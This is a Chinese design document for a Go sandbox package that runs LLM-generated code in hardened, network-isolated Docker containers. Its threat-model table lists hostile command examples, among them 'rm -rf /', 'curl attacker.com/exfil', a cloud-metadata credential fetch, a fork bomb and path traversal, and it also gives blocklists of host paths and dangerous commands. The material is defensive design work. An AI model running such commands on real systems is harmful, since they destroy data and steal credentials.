# 05 · 动态沙箱 `internal/sandbox`

> 代码：
> - `manager.go` (588) — 核心 `Manager`：`Execute` / `ExecuteStream` / `buildHostConfig` / `collectOutput`
> - `volume.go` (198) — `ExecuteWithVolume`：宿主目录 bind-mount + host path 黑名单
> - `warm_pool.go` (347) — `WarmPool` 预热容器池（**未在 main.go 接线**，骨架可用）
> - `tar.go` (46) — `tarWriter`：内存 tar 流 + 路径清洗（防目录穿越）
> - `_principles.go` (649) — 设计原理与威胁建模笔记（编译时随包）
> - `doc.go` (57) — package godoc 入口
>
> 测试：`manager_test.go` (165) / `warm_pool_test.go` (106)

---

## 1. 模块定位

**"给 Agent 一个能跑代码、但跑不出容器的手脚。"**

当 LLM 决定 ——

- 执行一段 Python / Go / Bash 脚本验证假设，
- 跑单元测试 (`go test ./...` / `pytest`)，
- 部署前的 dry-run 编译，

—— 这些动作必须在 **瞬态 + 资源受限 + 网络隔离** 的 Docker 容器里发生。本包提供五条保障：

| 维度         | 实现                                                      |
|--------------|-----------------------------------------------------------|
| **物理隔离** | 每次执行一个**新容器**，执行完立即 `ContainerRemove(Force=true)`（阅后即焚） |
| **资源限制** | cgroups v2：`Memory` / `NanoCPUs` / `PidsLimit=256` + `context.WithTimeout` 墙钟超时 |
| **网络限制** | `NetworkMode: none` 默认；显式白名单网络才允许出口         |
| **输出限流** | stdout/stderr 各 1 MiB 截断 → 防 `while true; print()` 把宿主进程内存打爆 |
| **实时流式** | `ExecuteStream` 走 `ContainerAttach` + `stdcopy.StdCopy` 解复用 → 逐行 channel |

---

## 1.5 设计哲学：纵深防御（Defense in Depth）

沙箱是**不可信输入**（LLM 生成的代码 + 用户粘贴的脚本）的运行容器。任何单层防御都假设会被绕过——多层叠加才能逼近真正的安全。

### 威胁建模

假设 LLM 被 prompt injection 攻陷 / 用户恶意，可能生成下表中的载荷：

| 威胁                              | 动机             | 本系统的防御层                           |
|-----------------------------------|------------------|------------------------------------------|
| `rm -rf /`                         | 破坏宿主机       | 容器 rootfs 与宿主隔离 + `ReadonlyRootfs` |
| `curl attacker.com/exfil`         | 数据外泄         | `NetworkMode=none` + Egress ACL          |
| `curl 169.254.169.254/...`        | 云元数据/IAM 凭据窃取 | `NetworkMode=none` + EgressValidator BlockedCIDRs |
| `:() { :\|:& }; :` fork bomb       | 资源耗尽         | `PidsLimit=256`                          |
| `dd if=/dev/zero of=file bs=1G`   | 磁盘耗尽         | Tmpfs `size=128m/64m` 限额               |
| `/bin/bash -p` setuid 提权         | 容器内提权       | `no-new-privileges` + `CapDrop=ALL`      |
| 覆写 `/bin/ls` 植后门              | 持久化           | `ReadonlyRootfs=true`                    |
| 下载到 `/tmp` → chmod +x → 执行    | 载荷执行链       | `/tmp` 显式 `noexec,nosuid`              |
| 挂载 `/var/run/docker.sock`       | 容器逃逸         | `volume.go` 的 `blockedHostPaths` 黑名单 |
| `while true; do ... done`         | CPU 耗尽         | `NanoCPUs` cgroup + 60s timeout          |
| 申请 100GB 内存                    | 内存耗尽         | `Memory` cgroup + OOM Kill               |
| 路径穿越 `../../etc/passwd`        | 写文件覆盖宿主   | `tar.go` 的 `filepath.Clean` + 去 `IsAbs`|

### 三道防线

```
┌───────────────────────────────────────────────────────┐
│ 防线 1：内容级（preventive）                          │
│                                                       │
│  internal/security/sensitive_patterns 正则             │
│  ├── 拦明显危险（DROP DATABASE / rm -rf / / kubectl   │
│  │   delete / terraform destroy）                     │
│  └── 命中 → HITL 审批挂起，不进沙箱                    │
│                                                       │
│  局限：正则只是"启发式"，能被空格/base64/同义命令绕    │
│        → 只能拦"明显"的，不能指望它独自顶事            │
└───────────────────────────────────────────────────────┘
                       │ （通过 / HITL 已批准）
                       ▼
┌───────────────────────────────────────────────────────┐
│ 防线 2：容器级（containing） ← 本包负责                │
│                                                       │
│  Docker 容器 + cgroups v2 + namespaces                │
│  ├── NetworkMode=none         网络隔离                │
│  ├── Memory / NanoCPUs        资源隔离                │
│  ├── PidsLimit=256            防 fork bomb            │
│  ├── ReadonlyRootfs=true      文件系统完整性          │
│  ├── Tmpfs /workspace + /tmp  可写区限额 + /tmp noexec │
│  ├── SecurityOpt no-new-priv  禁 setuid 提权          │
│  ├── CapDrop=ALL              清所有 Linux capability │
│  └── ctx Timeout + ForceRemove 防死循环 + 必清理       │
│                                                       │
│  这一层假设"内部代码即敌人"，用 Linux kernel 硬隔离    │
└───────────────────────────────────────────────────────┘
                       │ （即便容器逃逸）
                       ▼
┌───────────────────────────────────────────────────────┐
│ 防线 3：主机/网络级（detecting）                       │
│                                                       │
│  ├── 宿主机 iptables OUTPUT DROP                      │
│  ├── K8s NetworkPolicy / Cilium                       │
│  ├── PodSecurityPolicy / OPA Gatekeeper               │
│  ├── Falco / eBPF 异常 syscall 检测                   │
│  └── 可选：runtime 换 gVisor / Kata 加一层内核沙箱     │
│                                                       │
│  假设容器完全失陷，宿主层仍能兜底 + 告警               │
└───────────────────────────────────────────────────────┘
```

### 三个关键设计选择

**C1 — 瞬态容器 / "阅后即焚"**

每次 `Execute` 创建全新容器，绝不复用。权衡：

- ✅ 完全隔绝跨请求污染（上一次的恶意代码不会影响下一次）；
- ✅ 状态简单，没有 "清理逻辑漏处理某个目录" 的 bug 空间；
- ❌ 冷启动开销（image 已预热时仍 400-800ms，未拉镜像 5-30s）；
- ❌ tmpfs 无缓存 → `npm install` / `pip install` 每次都从头跑。

冷启动开销由 **warm pool**（§7）补救；依赖缓存由 **volume bind-mount**（§6）补救。两者**默认关**。

**C2 — `NetworkMode=none` 作为默认**

绝大多数沙箱任务用不到网络（本地编译、单元测试）。容器里的 `apt-get` / `pip install` 应该在 image 构建时预装好。如果脚本确实需要联网：

1. orchestrator 层通过 MCP 取数据，**注入**到容器；
2. 或显式建一个 `agent_sandbox_net` 私有网络，搭配 egress 白名单 + iptables。

**默认拒绝、白名单放行**是零信任原则在沙箱网络面的具体体现。

**C3 — `AutoRemove=false` 的反直觉选择**

Docker 的 `AutoRemove` 参数在容器退出时**立即**删除容器。我们**不用**它（`manager.go:176`）：

```go
hostCfg := m.buildHostConfig(...)
hostCfg.AutoRemove = false  // 我们需要先 ContainerLogs 再 Remove
```

原因：AutoRemove 会让我们来不及调 `ContainerLogs` 抓 stdout/stderr。正确流程是**手动**：`Wait → Logs → defer Remove(force=true)`——`defer` 保证无论中间什么 panic 都不会泄漏容器。

---

## 2. 依赖架构

```
        ┌────── orchestrator / file_tools.run_tests ──────┐
        │ Execute(req) / ExecuteStream(req) /             │
        │ ExecuteWithVolume(lang, cmd, hostDir)           │
        └───────────────────┬─────────────────────────────┘
                            ▼
                   ┌─────────────────┐
                   │ sandbox.Manager │
                   │  docker *client │
                   │  cfg    *Config │
                   └───┬──────┬──────┘
                       │      │ uses
                       │      ▼
                       │ docker/docker/client (SDK)
                       │      │
                       │      ▼
                       │  Docker Engine API (unix socket / tcp)
                       ▼
            ┌───────────────────────────────┐
            │  内部辅助：                    │
            │   resolveRuntime(req)         │
            │   ensureImage(ctx, image)     │
            │   buildHostConfig(mem, cpus)  │
            │   copyCodeToContainer(req)    │
            │   collectOutput(containerID)  │
            └───────────────────────────────┘

            ┌──────────────────────────────────┐
            │ sandbox.WarmPool (孤儿，未接线)   │
            │  Acquire(lang) / Release(c)      │
            │  replenishLoop goroutine         │
            └──────────────────────────────────┘
```

**关键观察**：

- `Manager` 是上层唯一入口；Docker SDK 客户端线程安全，可在多 goroutine 间共享；
- `buildHostConfig` 是 `Execute` / `ExecuteStream` / `ExecuteWithVolume` 共用的硬化配置中心——所有安全设置统一在此，**避免一处改了另一处漏**；
- `WarmPool` 在代码上独立、与 `Manager` 通过 `*client.Client` 共享，**但 `cmd/agent/main.go` 并未实例化它**——见 §7.4。

---

## 2.5 数据流总览

### 2.5.1 `Execute` 完整调用链（一次性同步执行）

```text
caller                Manager             Docker Engine API
  │                      │                       │
  │── Execute(req) ─────▶│                       │
  │                      │
  │ 1. resolveRuntime(req)
  │      lang → image    e.g. python:3.12-slim
  │      lang → cmd      e.g. ["python3", "/workspace/main.py"]
  │      lang → Files["main.py"] = req.Code   ← 关键：代码作为文件投递
  │
  │ 2. context.WithTimeout(ctx, req.Timeout || cfg.Timeout)
  │     execCtx ─ 所有 Docker API 共用，到期立即 cancel
  │
  │ 3. ensureImage(execCtx, imageName)
  │      ImageInspectWithRaw          ─▶ 本地有？跳过
  │      └── ImagePull + io.Copy(Discard, reader)  ← 等 pull 流完
  │
  │ 4. parseMemoryLimit("512m") → 536870912
  │    parseCPULimit("1.0")     → 1e9 (NanoCPUs)
  │
  │ 5. buildHostConfig(mem, cpus) → *HostConfig
  │     · NetworkMode=none / PidsLimit=256
  │     · SecurityOpt=no-new-priv / CapDrop=ALL
  │     · ReadonlyRootfs=true
  │     · Tmpfs /workspace=128m, /tmp=64m,noexec,nosuid
  │     hostCfg.AutoRemove = false   ← 必须，否则抓不到 logs
  │
  │ 6. ContainerCreate(cfg, hostCfg, name="sandbox-{uuid8}")
  │      → containerID
  │      defer ContainerRemove(force=true, 10s timeout)   ← 防泄漏
  │
  │ 7. copyCodeToContainer(execCtx, containerID, req)
  │      tarWriter 内存打包 {"main.py": req.Code}
  │      → CopyToContainer(/workspace, tarReader)
  │
  │ 8. ContainerStart(execCtx, containerID)
  │
  │ 9. ContainerWait(execCtx, containerID, NotRunning)
  │      → statusCh / errCh
  │      select:
  │        ← statusCh: ExitCode = status.StatusCode
  │        ← errCh:    Killed=true; Stderr="container execution error: ..."
  │        ← execCtx.Done(): ContainerKill(SIGKILL); Killed=true; ExitCode=-1
  │
  │ 10. collectOutput(bg ctx, containerID)
  │      ContainerLogs(Stdout:true, Stderr:true)
  │      stdcopy.StdCopy(stdoutBuf, stderrBuf, LimitReader(r, 2MiB))
  │      → 各自截 1 MiB
  │
  │ 11. defer ContainerRemove(force=true) ← 即使前面 panic 也执行
  │
  │◀── &SandboxResult{Stdout, Stderr, ExitCode, Duration, Killed}
```

### 2.5.2 `ExecuteStream` 完整调用链（流式输出）

```text
caller                Manager                          Docker Engine
  │── ExecuteStream(req) ─▶                            │
  │
  │  (前 5 步同 Execute，但 ContainerCreate 后…)
  │
  │  ContainerAttach(execCtx, ID, {Stream, Stdout, Stderr})
  │   → attachResp.Reader = 多路复用 [8B header][payload]
  │
  │  outCh := make(chan string, 128)
  │  errCh := make(chan error, 1)
  │
  │  stdoutW := chanWriter{ch: outCh, ctx: execCtx}
  │  stderrW := chanWriter{ch: outCh, ctx: execCtx, prefix:"[stderr] "}
  │
  │  go func() {
  │     defer close(outCh); defer close(errCh)
  │     defer cancel(); defer attachResp.Close()
  │     defer ContainerRemove(force=true)
  │     stdcopy.StdCopy(stdoutW, stderrW, attachResp.Reader)
  │     // ↑ 阻塞读到 EOF / 错误 / ctx 取消
  │  }()
  │
  │◀── (outCh, errCh, nil)
  │
  │  caller 边消费 outCh 边推 SSE「log」事件给前端
```

**关键设计**（`manager.go:328-377`）：

- 流不是直接给前端的 SSE handler——中间用 `chan string`（容量 128）解耦；
- `chanWriter.Write` 在 ctx 取消时**立即返回**，避免消费者关闭后 demux goroutine 永远阻塞在 `ch <- msg`；
- stderr 路用 `prefix: "[stderr] "` 标记，调用方在同一 channel 上即可区分两路。

### 2.5.3 `ExecuteWithVolume`（宿主目录挂载）

```text
caller                Manager                          Docker Engine
  │── ExecuteWithVolume(lang, cmd, hostDir) ─▶        │
  │
  │  validateHostDir(hostDir):
  │    realPath = filepath.EvalSymlinks(hostDir)
  │    for p in blockedHostPaths { /var/run/docker.sock, /proc, /sys, /etc, ... }:
  │       if realPath == p || HasPrefix(realPath, p+"/"): return error
  │    os.Stat → must be a directory
  │
  │  imageForLanguage(lang) → e.g. "golang:1.23-alpine"
  │  ensureImage(ctx, image)
  │
  │  hostCfg := buildHostConfig(512m, 1cpu)
  │  delete(hostCfg.Tmpfs, "/workspace")  ← 因为要 bind-mount
  │  hostCfg.ReadonlyRootfs = false        ← go build 需要写
  │  hostCfg.Mounts = [{TypeBind, Source: hostDir, Target: /workspace}]
  │
  │  ContainerCreate → Start → Wait → collectOutput → Remove
  │
  │◀── &SandboxResult{ExitCode, Stdout(stdout+stderr), Stderr, Duration}
```

**注意**：`ExecuteWithVolume` **关闭了 `ReadonlyRootfs`**——build / test 命令需要写 `~/.cache/go-build`、`__pycache__` 等。这是有意识的安全降级。当前两个合法调用点：

- `internal/orchestrator/file_tools.go:529` — `run_tests` 工具（跑 `go test` / `pytest` / `npm test`），`req.Command` 由 LLM 自由提供；
- `internal/generator/generator.go:497` — 项目骨架生成后的 build validation，命令由代码内部硬编码。

注意 `toolRunTests`（`file_tools.go:507`）**并未**校验 `req.Command`——它把 LLM 给的字符串直接拼成 `cd /workspace && <cmd>` 灌进容器，安全完全依赖容器隔离（NetworkMode=none / 容器删除即消失 / Tmpfs `/workspace`）而非命令白名单。新调用者必须**要么**走 HITL 审批，**要么**额外加命令前缀白名单（`go test|pytest|npm test|cargo test`）；详见 §13。

---

## 3. `Manager` 结构与初始化

```go
type Manager struct {
    docker *client.Client        // Docker Engine API 客户端（线程安全单例）
    cfg    *config.SandboxConfig // 只读配置
    logger *zap.Logger
}

func NewManager(cfg *config.SandboxConfig, logger *zap.Logger) (*Manager, error) {
    opts := []client.Opt{client.WithAPIVersionNegotiation()}
    if cfg.DockerHost != "" {
        opts = append(opts, client.WithHost(cfg.DockerHost))
    }
    dockerClient, err := client.NewClientWithOpts(opts...)
    if err != nil { return nil, ... }

    // 启动时做一次 Ping 验证 Docker socket 可达
    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()
    if _, err := dockerClient.Ping(ctx); err != nil {
        return nil, fmt.Errorf("failed to connect to Docker daemon: %w", err)
    }
    ...
}
```

`main.go` 对 sandbox **可选**——Docker 不可达时 `sandboxMgr = nil`，所有 handler 须 nil-check 才调用（`cmd/agent/main.go:299-308`）。

### 3.1 `SandboxConfig` 字段

```yaml
sandbox:
  docker_host: "unix:///var/run/docker.sock"     # 空 → SDK 默认
  default_image: "code-agent/sandbox-base:latest"
  images:
    python: "python:3.12-slim"
    go:     "golang:1.23-alpine"
    node:   "node:20-slim"
    bash:   "alpine:3.20"
  memory_limit: "512m"      # k/m/g 后缀；空 → 512m
  cpu_limit:    "1.0"       # 浮点核数；空 → 1
  timeout:      60s
  network_mode: "none"      # ⚠ 强烈建议
  workspace_dir: "/workspace"
```

`docker_host` 留空时 SDK 自动识别 `DOCKER_HOST` 环境变量或 `/var/run/docker.sock`。

---

## 4. 一次性执行 `Execute()`（`manager.go:123-256`）

```text
req: SandboxRequest{Language, Code, Files, Env, Timeout}
 │
 ├── 1. resolveRuntime(req) → (image, cmd)
 │       同时把 req.Code 写进 req.Files["main.<ext>"]
 │
 ├── 2. context.WithTimeout(ctx, req.Timeout || cfg.Timeout)
 │
 ├── 3. ensureImage(execCtx, image)
 │
 ├── 4. parseMemoryLimit / parseCPULimit
 │
 ├── 5. ContainerCreate
 │       hostCfg = buildHostConfig(mem, cpus)  ← 共享安全配置
 │       hostCfg.AutoRemove = false
 │       defer ContainerRemove(force=true)
 │
 ├── 6. copyCodeToContainer(execCtx, ID, req)
 │       tar → CopyToContainer
 │
 ├── 7. ContainerStart
 │
 ├── 8. select {
 │        ← statusCh:           ExitCode = StatusCode
 │        ← errCh:               Killed=true
 │        ← execCtx.Done():     ContainerKill(SIGKILL); Killed=true
 │     }
 │
 ├── 9. collectOutput(bg ctx, ID)
 │       → stdout, stderr 各 1 MiB 上限
 │
 └── return &SandboxResult{...}
```

### 4.1 `resolveRuntime` 的语言表（`manager.go:380-414`）

```go
switch lang {
case "python":            req.Files["main.py"] = req.Code
                          cmd = ["python3", "/workspace/main.py"]
case "go":                req.Files["main.go"] = req.Code
                          cmd = ["sh", "-c", "cd /workspace && go run main.go"]
case "node","javascript": req.Files["main.js"] = req.Code
                          cmd = ["node", "/workspace/main.js"]
case "bash","sh":         req.Files["script.sh"] = req.Code
                          cmd = ["sh", "/workspace/script.sh"]
default:                  req.Files["script.sh"] = req.Code
                          cmd = ["sh", "/workspace/script.sh"]
}
```

**关键安全特性 [OPT-4]**：**所有语言都走 tar-based file copy**——`req.Code` 写进 `req.Files` 然后 tar 注入，**永远不走 shell -c "<code>"**。后者会被代码里的引号 / 反斜杠 / `;` 直接 shell-inject 出去。`escapeShell` 函数在 [OPT-24] 已被废弃（`manager.go:584-588` 仅留 `_escapeShellDeprecated` 死代码以备审计）。

### 4.2 代码投递：`tar.go` 的内存 tar 流

```go
func (t *tarWriter) writeFile(name string, data []byte) error {
    cleanName := filepath.Clean(name)          // ← 防 ../../../etc/passwd
    if filepath.IsAbs(cleanName) {
        cleanName = cleanName[1:]              // ← 去前导 /
    }
    header := &tar.Header{Name: cleanName, Size: int64(len(data)), Mode: 0644, ModTime: time.Now()}
    if err := t.tw.WriteHeader(header); err != nil { return err }
    _, err := t.tw.Write(data)
    return err
}
```

**为什么打 tar？** Docker `CopyToContainer` API 协议本身就要求 tar-stream。**为什么在内存里打而不落盘？** 少一个 cleanup 坑 + 避免宿主文件系统污染。`tar.go` 仅 46 行——足以承担其全部职责。

### 4.3 输出截断（`manager.go:458-489`）

```go
const maxOutputBytes = 1 << 20 // 1 MiB

logReader := docker.ContainerLogs(ctx, ID, {ShowStdout, ShowStderr})
limitedReader := io.LimitReader(logReader, maxOutputBytes*2) // 给 demux header 2× 余量
stdcopy.StdCopy(&stdoutBuf, &stderrBuf, limitedReader)

if len(stdout) > maxOutputBytes {
    stdout = stdout[:maxOutputBytes] + "\n... [output truncated at 1MB]"
}
if len(stderr) > maxOutputBytes {
    stderr = stderr[:maxOutputBytes] + "\n... [stderr truncated at 1MB]"
}
```

**为什么 1 MiB？** LLM 上下文窗口经不起几 MB 的日志；而 1 MiB 已经能装下大多数测试输出。少数正常场景被截断时，上层应改走 `ExecuteStream` 让日志直推前端（不进 message history）。

---

## 5. `buildHostConfig` —— 硬化配置中心（`manager.go:496-536`）

> ⚠️ **历史教训（已修）**：早期版本 `Execute` 与 `ExecuteStream` 各自手写 HostConfig，但只设了 `NetworkMode + Memory + NanoCPUs`，其他硬化项（`PidsLimit` / `ReadonlyRootfs` / `Tmpfs`）**只在一处真正写入**。P0 #8 修复抽出统一 helper，三处调用者（`Execute` / `ExecuteStream` / `ExecuteWithVolume`）共用同一份配置——**改一次到处生效**。

```go
func (m *Manager) buildHostConfig(memoryLimit, nanoCPUs int64) *container.HostConfig {
    pidsLimit := int64(256)
    workspaceDir := m.cfg.WorkspaceDir
    if workspaceDir == "" { workspaceDir = "/workspace" }
    return &container.HostConfig{
        NetworkMode: container.NetworkMode(m.cfg.NetworkMode),
        Resources: container.Resources{
            Memory:    memoryLimit,
            NanoCPUs:  nanoCPUs,
            PidsLimit: &pidsLimit,
        },
        SecurityOpt:    []string{"no-new-privileges:true"},
        CapDrop:        strslice.StrSlice{"ALL"},
        ReadonlyRootfs: true,
        Tmpfs: map[string]string{
            workspaceDir: "rw,size=128m",
            "/tmp":       "rw,noexec,nosuid,size=64m",
        },
    }
}
```

每条防御项的原理：

| 字段                              | 防什么                        | 说明                                                  |
|-----------------------------------|-------------------------------|-------------------------------------------------------|
| `NetworkMode=none`                | 外联 / 反弹 shell / IMDS 窃取  | 容器无网络栈，连 localhost 都没                       |
| `Memory` / `NanoCPUs`             | 资源耗尽                       | cgroups v2 强制，超内存即 OOM-Killed                  |
| `PidsLimit=256`                   | Fork bomb                      | cgroups v2 的 `pids.max`，超过拒绝 fork               |
| `SecurityOpt=no-new-privileges`   | setuid / file capabilities 提权 | Linux `PR_SET_NO_NEW_PRIVS` prctl                     |
| `CapDrop=ALL`                     | CAP_NET_RAW / CAP_SYS_ADMIN ... | `python script.py` 不需要任何 capability               |
| `ReadonlyRootfs=true`             | 覆写 `/bin/*` 植后门            | 根文件系统只读；需写处用 Tmpfs 显式开                  |
| `Tmpfs /workspace size=128m`      | —                              | 允许 `go build` 输出可执行文件（**故意不设 noexec**） |
| `Tmpfs /tmp size=64m,noexec,nosuid` | "下载到 /tmp → chmod +x → 执行" | /tmp 可写但禁执行 + 禁 setuid                          |

**为什么 `/workspace` 不设 noexec？** Go / Rust / C 编译会把可执行二进制写进 `/workspace`——加 noexec 会让自己的产物跑不起来。`/tmp` 不一样，那是 pip / npm 缓存目录，攻击者会把下载到 /tmp 的二进制 chmod +x 后执行，必须断链。

### 5.1 `Privileged` / seccomp 默认值

```go
// 不需要显式设：
// Privileged: false       默认 false。设为 true 等于 CapDrop 失效 + 所有 device 访问 → 绝对禁
// SecurityOpt: seccomp=unconfined  不设 → 走 Docker 默认 seccomp profile（已禁 ~50 个危险 syscall）
```

如果将来要换 gVisor / Kata，只需在 ContainerCreate 加 `Runtime: "runsc"`，其他配置完全兼容。

---

## 6. 长寿命执行 `ExecuteWithVolume()`（`volume.go`）

**适用场景**：跑 `go test` / `pytest` / `npm test`，需要访问整个项目目录（而不是一个 inline 脚本）。

```go
ExecuteWithVolume(ctx, language, command, hostDir string) (*SandboxResult, error) {
    validateHostDir(hostDir)                            // ← 第一道闸：黑名单
    image := imageForLanguage(language)
    ensureImage(ctx, image)

    hostCfg := buildHostConfig(512m, 1cpu)
    delete(hostCfg.Tmpfs, "/workspace")                 // ← 不要 tmpfs，要 bind
    hostCfg.ReadonlyRootfs = false                      // ← build 需要写 ~/.cache
    hostCfg.Mounts = [{TypeBind, Source: hostDir, Target: "/workspace"}]

    ContainerCreate → Start → Wait → collectOutput → Remove
}
```

### 6.1 黑名单 host path（`volume.go:46-80`）

```go
var blockedHostPaths = []string{
    "/var/run/docker.sock",  // ← 挂载即等于容器逃逸
    "/var/run",
    "/proc",                 // ← 挂载 /proc 可读宿主进程
    "/sys",                  // ← 可改 cgroups
    "/etc",                  // ← 可读 /etc/shadow
    "/root",
    "/boot",
    "/dev",                  // ← 可访问 /dev/sda
}

func validateHostDir(hostDir string) error {
    realPath := filepath.EvalSymlinks(hostDir)   // ← 解符号链接防"软链绕过"
    for _, blocked := range blockedHostPaths {
        if realPath == blocked || strings.HasPrefix(realPath, blocked+"/") {
            return fmt.Errorf("host path blocked: %s resolves to %s", ...)
        }
    }
    os.Stat(realPath); must be a directory
}
```

`filepath.EvalSymlinks` 是**关键**——攻击者可能在 hostDir 路径里塞一个软链指向 `/etc`。先解符号链接、再做前缀匹配，闭合这个绕过。

### 6.2 与 `Execute` 的差异

| 维度       | `Execute`                       | `ExecuteWithVolume`                |
|------------|---------------------------------|------------------------------------|
| 代码来源   | `req.Code` inline               | 宿主目录已存在的项目树             |
| 文件投递   | `tar` + `CopyToContainer`       | 直接 bind-mount                    |
| Rootfs     | ReadonlyRootfs=true             | **false**（build 需写 ~/.cache）   |
| 副作用     | 无（容器删除即消失）            | **有**：脚本可写文件回宿主          |
| 用途       | 执行 LLM 生成的脚本             | 跑"对本项目仓库的命令"             |
| 调用者     | `tools.execute_code`            | `tools.run_tests` + `generator` build validate |

> ⚠️ **安全暗礁**：`ExecuteWithVolume` 让脚本能修改/破坏挂载的宿主目录。普通 `execute_code` 工具调用**绝不**路由到这里——只有 `internal/orchestrator/file_tools.go:toolRunTests`（`req.Command` 由 LLM 自由提供，**目前无白名单校验**，直接拼入 `cd /workspace && <cmd>`，安全靠容器隔离兜底）和 `internal/generator/generator.go:497` 的 build validate（命令由代码硬编码）才使用。任何新调用点都必须走 HITL 审批或白名单路径；为 `toolRunTests` 加命令前缀白名单是已识别的 P0 加固项（详见 §12）。

---

## 7. 预热容器池 `WarmPool`（`warm_pool.go`）

> ⚠️ **现状**：`WarmPool` 在代码上完整可用（包含 `Start` / `Acquire` / `Release` / `Stop` / `Metrics` 一套接口 + 单测 `warm_pool_test.go`），**但 `cmd/agent/main.go` 未实例化它**。这是一个"骨架就绪、未接线"状态的模块——下文描述其设计意图与接线方式。

### 7.1 优化动机

`Execute` 每次冷启动一个新容器：

| 阶段                  | 冷启动（image 已在本地）  |
|-----------------------|---------------------------|
| `ContainerCreate`     | 50-100 ms                 |
| `copyCodeToContainer` | < 10 ms                   |
| `ContainerStart`      | 100-300 ms                |
| 代码执行（hello-world）| 50 ms                     |
| `Wait` + `Logs` + `Remove` | 50-150 ms             |
| **总耗时**            | **400-800 ms**            |

`Create` + `Start` 占了 60%+。用户感觉"跑一段 Python 比裸机慢 10 倍"。

**优化思路**：把**慢的部分**预先做好——按 language 维持 N 个"已启动、空转 sleep 的"容器，请求到来时 `docker exec` 注入代码即时运行。

### 7.2 关键设计：**每次 exec 后立即销毁**

```go
func (p *WarmPool) Release(c *PooledContainer) {
    p.forceRemove(c.ID)              // ← 不复用！销毁
    p.recycled.Add(1)
    // replenishLoop 看到 len(queue) < target 会自动补位
}
```

**为什么不复用？** 复用会留下文件系统残留（`/tmp` 污染 / 环境变量 / 后台进程）—— 攻击者可跨任务读旧数据。**做到"一次 exec 后立即销毁"才能保住"阅后即焚"语义**。这意味着 WarmPool 不是缓存复用，而是**预创建队列**：把 Create+Start 的 400ms 移到请求之外。

### 7.3 实现要点

```go
type WarmPool struct {
    cli    *client.Client
    sbCfg  *config.SandboxConfig
    cfg    *WarmPoolConfig
    queues map[string]chan *PooledContainer  // 每语言一个 buffered chan
    stopCh chan struct{}
    wg     sync.WaitGroup
    // 观测计数器
    acquired, fallback, created, recycled atomic.Uint64
}
```

- **生产者**：`replenishLoop` goroutine（每语言一个），看到 `len(queue) < target` 就 `createPooled` 补一个；
- **消费者**：业务请求调 `Acquire(lang)`——50 ms 内拿不到就 fallback 走冷路径（`MaxWaitMs=50`）；
- **失败退避**：Docker 不可用时 `createPooled` 错误，退避 1→2→4→...→30s 重试，**不打死循环日志**；
- **优雅关闭**：`Stop(ctx)` 关 `stopCh`，所有 replenishLoop 退出并 drain 队列 + 强删存量容器。

### 7.4 性能预期（来自 `_principles.go` 注释）

- Python 简短脚本端到端延迟：**800ms → 90ms（-89%）**；
- 10 QPS 并发时池稳定在 2-5 个，内存可控；
- 启动代价：`poolSize × ~500ms` extra（可接受）。

### 7.5 接线 TODO

要启用 WarmPool，`cmd/agent/main.go` 需加：

```go
warmPool := sandbox.NewWarmPool(sandboxMgr.docker, &cfg.Sandbox, warmCfg, logger)
if err := warmPool.Start(ctx); err != nil { ... }
defer warmPool.Stop(ctx)

sandboxMgr.SetWarmPool(warmPool)   // ← Manager 需新增 SetWarmPool + Execute 内先 Acquire
```

`Manager.Execute` 内部需要加分支：先 `warmPool.Acquire(lang)`，拿到就 `docker exec`；拿不到走 `ContainerCreate` 冷路径。当前 `Execute` 没有这个分支——这是真正"接线"的工作量，骨架虽备但**对外行为完全等同未启用**。

---

## 8. 资源限额细节

### 8.1 Memory（`parseMemoryLimit`，`manager.go:548-571`）

```go
"512m" → 512 * 1024 * 1024 bytes
"1g"   → 1 * 1024 * 1024 * 1024 bytes
"0"    → 512 MB（默认兜底）
```

支持 `k` / `m` / `g` 后缀（大小写不敏感）；纯数字当字节。超过即 **OOM-Killed**——`ContainerWait` statusCh 返回的 State 里 `OOMKilled=true`，本系统将其映射到 `SandboxResult.Killed=true`（区分于 timeout 的 `ExitCode=-1`）。

### 8.2 CPU（`parseCPULimit`，`manager.go:573-582`）

```go
"1.0"  → 1e9 (NanoCPUs)        // 1 个核
"1.5"  → 1.5e9                  // 1.5 核等效
"0.5"  → 0.5e9                  // 半核
```

NanoCPUs 是 Docker SDK 对 cgroups CFS 时间片的封装：`cpu_period=100000 + cpu_quota=quota_us` → 每 100ms 窗口最多占 `quota` 微秒 CPU。

### 8.3 网络

```yaml
network_mode: "none"               # 默认，强烈建议
# network_mode: "bridge"           # ⚠ 有外网，不推荐
# network_mode: "agent_sandbox_net"  # 白名单网络
```

需要联网时：

1. docker-compose / k8s 里建 `agent_sandbox_net`；
2. 把 DB / api-gateway 服务 attach 进这个网络；
3. 设 `network_mode: "agent_sandbox_net"`；
4. 出口防火墙白名单 + `internal/security/egress.go` 做 DNS / IP 二级校验。

### 8.4 OOM vs Timeout 的语义区分

```go
case status := <-statusCh:
    result.ExitCode = int(status.StatusCode)   // OOM → 137
case <-execCtx.Done():
    docker.ContainerKill(SIGKILL)
    result.Killed = true
    result.ExitCode = -1                       // timeout → -1
    result.Stderr = "execution timed out"
```

调用方可以通过 `(Killed=true && ExitCode=137)` vs `(Killed=true && ExitCode=-1)` 区分两种死法，**但当前 collectOutput 之后会把空 stderr 改写**——某些 OOM 场景信息会丢失。见 §12 P0 修复列表。

---

## 9. 生命周期与幂等

```
┌─────────────┐
│ Create ─────│ 容器存在但未启动 → defer Remove 必清
│ CopyTo ─────│ tar 注入
│ Start  ─────│
│ Wait   ─────│ block 到 NotRunning 或 ctx 取消
│ Logs   ─────│ 收尾抓 stdout/stderr
│ Remove ─────│ force=true，10s timeout
└─────────────┘
```

`defer` 保证无论中间什么 panic / 早 return 都执行 `ContainerRemove(force=true)`——配合启动时的**孤儿容器扫描**（可选，启动期 `ContainerList(filter: label=code-agent.sandbox=true)` 强删）保证宿主长期运行下没有泄漏容器。

> 当前代码**未**给容器打 label——孤儿扫描是 §12 P1 的事，详见后续演进。

---

## 10. 配置示例

```yaml
sandbox:
  docker_host: ""                            # 空 → 用 DOCKER_HOST or unix:///var/run/docker.sock
  default_image: "alpine:3.20"
  images:
    python: "python:3.12-slim"
    go:     "golang:1.23-alpine"
    node:   "node:20-slim"
    bash:   "alpine:3.20"
    rust:   "rust:1.78-slim"
  memory_limit: "512m"
  cpu_limit:    "1.0"
  timeout:      60s
  network_mode: "none"
  workspace_dir: "/workspace"
```

### 10.1 自建预制镜像建议

- 已预装常见依赖（python: requests / pyyaml；node: lodash / axios），减少每次 `pip install` 时间；
- 默认用户 `nobody` UID 65534，避免 root 在容器内执行；
